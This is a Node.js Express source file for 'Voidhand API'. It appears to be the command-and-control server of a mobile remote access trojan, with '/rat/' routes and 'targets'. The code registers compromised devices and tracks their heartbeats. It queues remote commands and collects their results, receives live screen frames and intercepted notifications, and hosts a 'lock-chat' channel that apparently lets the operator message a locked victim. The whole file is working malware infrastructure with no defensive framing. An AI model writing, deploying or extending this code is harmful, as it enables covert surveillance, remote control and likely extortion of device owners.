const express = require("express");
const crypto = require("crypto");

const app = express();
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

const store = {
  targets: [],
  commands: [],
  responses: [],
  notifications: [],
  liveFrames: {},
  lockChats: {},
  pairs: {},
};

function genPairId() {
  return crypto.randomBytes(8).toString("hex").toUpperCase();
}

app.get("/ping", (_req, res) => res.send("pong"));

app.post("/api/claim-pair", (req, res) => {
  const pairId = genPairId();
  store.pairs[pairId] = { id: pairId, createdAt: Date.now() };
  res.json({ valid: true, pairId });
});

app.get("/rat/pairid", (req, res) => {
  const existing = Object.keys(store.pairs);
  if (existing.length > 0) {
    return res.json({ valid: true, pairId: existing[0] });
  }
  const pairId = genPairId();
  store.pairs[pairId] = { id: pairId, createdAt: Date.now() };
  res.json({ valid: true, pairId });
});

app.post("/api/pair-target", (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId)
    return res.status(400).json({ error: "pairId and deviceId required" });

  if (!store.pairs[pairId.toUpperCase()])
    return res.status(404).json({ error: "invalid pairId" });

  let t = store.targets.find((x) => x.id === deviceId);
  if (t) {
    t.pairId = pairId;
    t.model = model || t.model;
    t.battery = battery || t.battery;
    t.status = "Online";
    t.lastSeen = new Date().toISOString();
  } else {
    store.targets.push({
      id: deviceId,
      model: model || "Unknown",
      battery: battery || "?",
      pairId,
      status: "Online",
      lastSeen: new Date().toISOString(),
    });
  }

  res.json({ status: "paired" });
});

app.post("/api/register-target", (req, res) => {
  const d = req.body;
  if (!d.id) return res.status(400).json({ error: "id required" });

  let t = store.targets.find((x) => x.id === d.id);
  if (t) Object.assign(t, d, { lastSeen: new Date().toISOString() });
  else store.targets.push({ ...d, lastSeen: new Date().toISOString() });

  res.json({ status: "ok" });
});

app.post("/api/heartbeat/:id", (req, res) => {
  const t = store.targets.find((x) => x.id === req.params.id);
  if (t) {
    t.lastSeen = new Date().toISOString();
    t.status = "Online";
    if (req.body.battery) t.battery = req.body.battery;
  }
  res.status(200).send("1");
});

app.get("/api/list-targets", (req, res) => {
  res.json(store.targets);
});

app.get("/rat/my-devices", (req, res) => {
  const now = Date.now();
  for (const t of store.targets) {
    const seen = Date.parse(t.lastSeen || 0) || 0;
    if (now - seen > 30000) t.status = "Offline";
  }

  const devices = store.targets.map((t) => ({
    id: t.id,
    model: t.model || "Unknown",
    battery: t.battery || "?",
    online: t.status === "Online",
    lastSeen: t.lastSeen,
  }));

  res.json({
    valid: true,
    pairId: Object.keys(store.pairs)[0] || null,
    devices,
    myDevicesCount: devices.length,
    totalDevices: devices.length,
  });
});

app.get("/rat/permission-status", (_req, res) => {
  res.json({ valid: true });
});

app.post("/api/send-command", (req, res) => {
  const { id, command, extra } = req.body;
  if (!id || !command)
    return res.status(400).json({ error: "id + command required" });

  store.commands = store.commands.filter((c) => c.targetId !== id);
  store.commands.push({
    targetId: id,
    command,
    extra: extra || "",
    timestamp: new Date().toISOString(),
  });

  res.json({ status: "queued" });
});

app.get("/api/get-command/:id", (req, res) => {
  const i = store.commands.findIndex((c) => c.targetId === req.params.id);
  if (i === -1) return res.status(204).send();

  const cmd = store.commands[i];
  store.commands.splice(i, 1);
  res.json(cmd);
});

app.post("/api/post-response/:id", (req, res) => {
  const { cmd, data } = req.body;
  const i = store.responses.findIndex((r) => r.targetId === req.params.id);

  const nr = {
    targetId: req.params.id,
    cmd,
    data,
    timestamp: new Date().toISOString(),
  };

  if (i !== -1) store.responses[i] = nr;
  else store.responses.push(nr);

  res.json({ status: "ok" });
});

app.get("/api/get-response/:id", (req, res) => {
  res.json(store.responses.find((r) => r.targetId === req.params.id) || {});
});

app.post("/api/live-frame/:id", (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: "no frame" });

  store.liveFrames[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: "ok" });
});

app.get("/api/live-frame/:id", (req, res) => {
  const d = store.liveFrames[req.params.id];
  if (!d) return res.status(404).json({ error: "no frame yet" });
  res.json(d);
});

app.post("/api/post-notification/:id", (req, res) => {
  store.notifications.unshift({
    targetId: req.params.id,
    ...req.body,
    timestamp: new Date().toISOString(),
  });

  if (store.notifications.length > 1000) store.notifications.length = 1000;

  res.json({ status: "saved" });
});

app.get("/api/get-notifications/:id", (req, res) => {
  res.json(store.notifications.filter((n) => n.targetId === req.params.id));
});

app.get("/api/lock-chat/:id", (req, res) => {
  res.json({ messages: store.lockChats[req.params.id] || [] });
});

app.post("/api/lock-chat/:id", (req, res) => {
  const id = req.params.id;
  const { from, text, msg } = req.body;

  if (!store.lockChats[id]) store.lockChats[id] = [];

  store.lockChats[id].push({
    from: from || "owner",
    text: text || msg || "",
    time: new Date().toISOString(),
  });

  if (store.lockChats[id].length > 100)
    store.lockChats[id] = store.lockChats[id].slice(-100);

  res.json({ status: "ok" });
});

app.get("/api/lock-chat-all/:id", (req, res) => {
  res.json({ messages: store.lockChats[req.params.id] || [] });
});

app.delete("/api/lock-chat/:id", (req, res) => {
  store.lockChats[req.params.id] = [];
  res.json({ status: "cleared" });
});

app.get("/api/stats", (_req, res) => {
  const now = Date.now();
  const online = store.targets.filter((t) => {
    const seen = Date.parse(t.lastSeen || 0) || 0;
    return now - seen < 30000;
  }).length;

  res.json({
    onlineUsers: online,
    activeConnections: store.targets.length,
    totalTargets: store.targets.length,
  });
});

app.get("/", (_req, res) =>
  res.json({ name: "Voidhand API", status: "ok", version: "1.0.0" })
);

module.exports = app;

if (require.main === module) {
  const PORT = process.env.PORT || 3006;
  app.listen(PORT, "0.0.0.0", () =>
    console.log(`Voidhand API listening on :${PORT}`)
  );
    }
